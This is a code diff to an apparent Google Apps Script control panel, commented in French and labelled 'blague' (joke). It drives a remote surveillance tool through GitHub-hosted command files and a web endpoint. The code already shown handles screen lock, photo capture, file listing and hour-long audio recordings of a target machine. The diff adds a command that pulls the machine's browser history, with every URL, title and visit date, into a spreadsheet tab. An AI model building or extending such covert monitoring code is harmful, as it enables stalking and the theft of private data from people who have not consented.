@@ -24,6 +24,7 @@ const LOCK_PATH    = 'data/blague_lock.json';
 const PHOTO_PATH   = 'data/blague_photo.json';
 const LISTING_PATH = 'data/blague_listing.json';
 const AUDIO_PATH   = 'data/blague_audio.json';
+const HISTORY_PATH = 'data/blague_historique.json';
 const JOURS_MAX    = 30;
 
 function _token() {
@@ -111,6 +112,30 @@ function enregistrerAudio() {
   SpreadsheetApp.getUi().alert('🎙️ Enregistrement lancé ! Le fichier audio (60 min) arrivera dans ton Drive à la fin.');
 }
 
+// ── HISTORIQUE NAVIGATION ────────────────────────────────────────
+
+function demanderHistorique() {
+  const f = _githubGet(HISTORY_PATH);
+  _githubPut(HISTORY_PATH, { get_history: true }, f.sha);
+  SpreadsheetApp.getUi().alert('🌐 Demande envoyée ! L\'historique arrive dans l\'onglet "Historique".');
+}
+
+function _afficherHistorique(data) {
+  const ss    = SpreadsheetApp.getActiveSpreadsheet();
+  let sheet   = ss.getSheetByName('🌐 Historique');
+  if (sheet) sheet.clear();
+  else sheet  = ss.insertSheet('🌐 Historique');
+
+  sheet.appendRow(['🌐 Historique de ' + data.machine + ' — ' + data.date]);
+  sheet.appendRow(['Navigateur', 'Titre', 'URL', 'Visité le']);
+  sheet.getRange(2, 1, 1, 4).setFontWeight('bold').setBackground('#e6f4ea');
+
+  const rows = data.historique.map(h => [h.navigateur, h.titre || '', h.url, h.visite]);
+  if (rows.length > 0) sheet.getRange(3, 1, rows.length, 4).setValues(rows);
+  sheet.autoResizeColumns(1, 4);
+  ss.setActiveSheet(sheet);
+}
+
 // ── LISTING FICHIERS ─────────────────────────────────────────────
 
 function demanderListing() {
@@ -153,6 +178,11 @@ function doPost(e) {
       const bytes = Utilities.base64Decode(data.audio);
       const blob  = Utilities.newBlob(bytes, 'audio/mpeg', data.filename);
       DriveApp.getFolderById(FOLDER_ID).createFile(blob);
+      return ContentService.createTextOutput('ok');
+    }
+
+    if (data.type === 'historique') {
+      _afficherHistorique(data);
       return ContentService.createTextOutput('ok');
     }
 
